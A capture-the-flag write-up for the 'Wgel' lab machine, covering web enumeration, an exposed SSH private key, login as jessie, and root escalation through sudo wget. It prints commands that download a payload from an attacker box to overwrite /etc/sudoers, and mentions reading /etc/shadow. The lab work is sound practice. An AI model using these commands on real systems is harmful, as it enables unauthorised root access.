# Wgel CTF

## Objective
- Achieve root 

## Target
- IP: 10.130.144.130

## Enumeration
### Network
- Scan performed: ```text 
	nmap -sV -sC -oN nmap.txt TARGET_IP ```
- Open Ports: 
	We can see immediately that ports 22 for SSH and port 80 for HTTP
	In many assessments, when you see just these two, the most probable attack surface is the web service

### Web
- I did a quick visit to our target site and discovered a default ubuntu page
- Upon inspection, I found a comment that mentioned a user name Jessie so I took note of that
- Next up fired a gobuster scan at our target and found a hidden endpoint on /sitemap, before looking at anything cos I was too attached to my terminal at the time decided to fire another directory bust on the sitemap endpoint to further find anymore potential endpoints. 
And I did - /sitemap/.ssh
- I visited the endpointed to find an id_rsa file and everything went smooth sail from there
- I quickly saved it on my computer using ```bash wget http://TARGET_IP/sitemap/.ssh/id_rsa ``` and then ran this command ```bash chmod 400 id_rsa```.
Using this new found knowledge I went back to the other dude that was discovered by nmap

## Initial Access
- Using the combo of the info we found earlier
- I simply had to ssh into the machine with ```text ssh -I id_rsa jessie@TARGET_IP``` and boom, we're in 😁
- I quickly did some basic enumeration 
```text 
	uname -a
	hostname
	cat /proc/version
	pwd
```
- Now to get our user flag ```text ls -R``` - It's in the Documents folder

## Privilege Escalation
- Basic was ```text sudo -l ``` and we see that we can run wget command without a passwd as root
- I got it wrong at first, stumbling in the dark and on GTFOBins.org for a privesc vector
I previously used sudo wget to try and read /etc/shadow but the hash I found was practically uncrackable so I knew I had it wrong. After some research and a few hintings I figured out what the privesc was. 
- I had to use wget to overwrite a very important file that is owned by root. Reviewing where the information and set permissions of jessie came from after running the ```text sudo -l ``` came from, it was the /etc/sudoers file. Given that wget can run as root and without password. If I could download a file that wrote to that file and changed things up a bit, what would happen?
- Once that idea clicked, I headed over to my attackbox and ```text echo 'jessie ALL=(ALL:ALL) NOPASSWD: ALL' > payload' and then did ```bash python3 -m http.server 8000```
- Back on my target box simply abused wget privileges by doing ```bash sudo wget ATTACKBOX_IP:8000/payload -O /etc/sudoers```; And that was it, my permissions in the sudoers file were set in stone 😈😈
- If we run the ```bash sudo -l ``` command again, we can see that we now have access to do everything without a password as root.
- If we wanted we could simply su to root without a password, change root password or just simply look into /root to find our flag waiting for us to cat it out

## Attack Chain
1. Exposed username on default ubuntu page
2. Exposed .ssh endpoint on web app
3. Overpowered use of wget
4. 


## Mistakes / Dead Ends
- I did try cracking the hash from /etc/shadow, but quickly hit a wall
- It appeared that simply reading the contents of a file wasn't the intended attack chain but rather, writing to one
- It's the man pages that I should have paid more attention to, would have saved me a lot of computing power 🥲



















Target = 10.130.144.130
Open ports = 22, 80
Port 80 is almost always the attack surface which information is gathered and then used to gain a more stable access through ssh, so 80 now, 22 later

visiting the site on port 80 was a default ubuntu page so our target is an ubuntu machine
I did a busting of directory on the http and discovered a sitemap endpoint
Further busting of directory revealed a .ssh endpoint containing a private key probably for ss, upon inspection, it had no password protecting it. 
I tried extracting a possible username but couldn't find anything else so the next logical step for me was to bruteforce usernames
